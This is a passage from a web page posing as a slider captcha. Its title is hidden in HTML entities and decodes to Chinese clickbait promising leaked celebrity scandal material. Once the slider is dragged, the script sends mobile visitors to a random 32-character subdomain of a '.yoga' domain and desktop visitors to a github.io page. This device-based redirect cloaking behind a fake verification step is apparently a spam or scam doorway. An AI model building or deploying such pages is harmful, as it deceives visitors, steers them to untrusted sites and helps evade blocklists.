hadow: 0 4px 10px rgba(0, 0, 0, 0.1); z-index: 2; transition: background-color 0.2s, box-shadow 0.2s; } .slider-button:active { cursor: grabbing; background-color: #f9fafb; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15); } .slider-button svg { width: 20px; height: 20px; fill: none; stroke: var(--primary-color); stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; transition: stroke 0.3s, transform 0.3s; } .captcha-container.success .slider-track { border-color: var(--success-color); background-color: rgba(16, 185, 129, 0.1); } .captcha-container.success .slider-button { background-color: var(--success-color); box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3); cursor: default; } .captcha-container.success .slider-button svg { stroke: #ffffff; transform: scale(1.1); } .captcha-container.success .slider-text { color: var(--success-color); font-weight: 600; } .captcha-footer { margin-top: 35px; } .captcha-footer h2 { color: var(--text-color); font-size: 24px; margin-bottom: 8px; font-weight: 700; } .captcha-footer p { color: #6b7280; font-size: 14px; } .captcha-footer p a { margin: 5px; } </style></head><body> <div class="captcha-container" id="captchaContainer"> <div class="captcha-header"> <h1>&#x7f51;&#x7ea2;&#x7206;&#x6599;&#x5f;&#x53cd;&#x5dee;&#x540d;&#x573a;&#x9762;&#x5408;&#x96c6;&#x5f;&#x4eca;&#x65e5;&#x5403;&#x74dc;&#x52b2;&#x7206;&#x9ed1;&#x6599;&#x5927;&#x516c;&#x5f00;</h1> <p>请向右滑动进入</p> </div> <div class="slider-track" id="sliderTrack"> <div class="slider-bg" id="sliderBg"></div> <div class="slider-text" id="sliderText">向右滑动进入</div> <div class="slider-button" id="sliderButton"> <svg id="sliderIcon" viewBox="0 0 24 24"> <path d="M5 12h14M12 5l7 7-7 7"/> </svg> </div> </div> <div class="captcha-footer"> <h2>相关链接</h2> <p>[放置链接]</p> </div> </div> <script> const container = document.getElementById('captchaContainer'); const track = document.getElementById('sliderTrack'); const button = document.getElementById('sliderButton'); const bg = document.getElementById('sliderBg'); const text = document.getElementById('sliderText'); const icon = document.getElementById('sliderIcon'); let isDragging = false; let startX = 0; let maxResult = 0; let isSuccess = false; function generateRandom32() { const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; let result = ''; for (let i = 0; i < 32; i++) { result += chars.charAt(Math.floor(Math.random() * chars.length)); } return result; } function isMobile() { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); } function getTargetUrl() { if (isMobile()) { const template = "https://{xxx}.dnoxmrxxgv.yoga/"; const randomStr = generateRandom32(); return template.replace('{xxx}', randomStr); } else { return "https://wrightamanda379139.github.io/"; } } function initMaxResult() { maxResult = track.clientWidth - button.clientWidth - 4; } initMaxResult(); window.addEventListener('resize', initMaxResult); const getEventX = (e) => e.touches ? e.touches[0].clientX : e.clientX; function dragStart(e) { if (isSuccess) return; isDragging = true; startX = getEventX(e); button.style.transition = 'none'; bg.style.transition = 'none'; } function dragMove(e) { if (!isDragging || isSuccess) return; let moveX = getEventX(e) - startX; if (moveX < 0) moveX = 0; if (moveX > maxResult) moveX = maxResult; button.style.left = moveX + 2 + 'px'; bg.style.width = moveX + button.clientWidth / 2 + 'px'; text.style.opacity = 1 - (moveX / maxResult); } function dragEnd() { if (!isDragging || isSuccess) return; isDragging = false; let currentX = parseInt(button.style.left) - 2; if (currentX >= maxResult * 0.95) { verifySuccess(); } else { button.style.transition = 'left 0.3s cubic-bezier(0.25, 1, 0.5, 1)'; bg.style.transition = 'width 0.3s cubic-bezier(0.25, 1, 0.5, 1)'; button.style.left = '2px'; bg.style.width = '0px'; text.style.opacity = 1; } } function verifySuccess() { isSuccess = true; button.style.left = maxResult + 2 + 'px'; bg.style.width = '100%'; container.classList.add('success'); text.textContent = '验证通过'; text.style.opacity = 1; icon.innerHTML = '<path d="M20 6L9 17l-5-5"/>'; setTimeout(() => { window.location.href = getTargetUrl(); }, 800); } button.addEventListener('mousedown', dragStart); window.addEventListener('mousemove', dragMove); window.addEventListener('mouseup', dragEnd); button.addEventListener('touchstart', dragStart, { passive: true }); window.addEventListener('touchmove', dragMove, { passive: false }); window.addEventListener('touchend', dragEnd); </script></body></html>
